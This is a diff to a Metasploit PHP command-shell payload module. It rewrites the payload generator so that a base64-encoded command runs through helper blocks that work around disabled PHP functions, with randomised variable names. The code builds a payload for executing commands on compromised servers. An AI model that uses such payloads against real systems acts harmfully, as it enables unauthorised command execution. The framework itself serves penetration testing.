@@ -3,16 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 230
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
+  include Msf::Payload::Php
 
   def initialize(info = {})
     super(merge_info(info,
@@ -36,8 +34,15 @@ module MetasploitModule
   #
   # Constructs the payload
   #
-  def generate
-    return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'));"
+  def generate(_opts = {})
+    vars = Rex::RandomIdentifier::Generator.new
+    dis = "$#{vars[:dis]}"
+    shell = <<-END_OF_PHP_CODE
+              #{php_preamble(disabled_varname: dis)}
+              $c = base64_decode("#{Rex::Text.encode_base64(command_string)}");
+              #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
+    END_OF_PHP_CODE
+    return super + shell
   end
 
   #
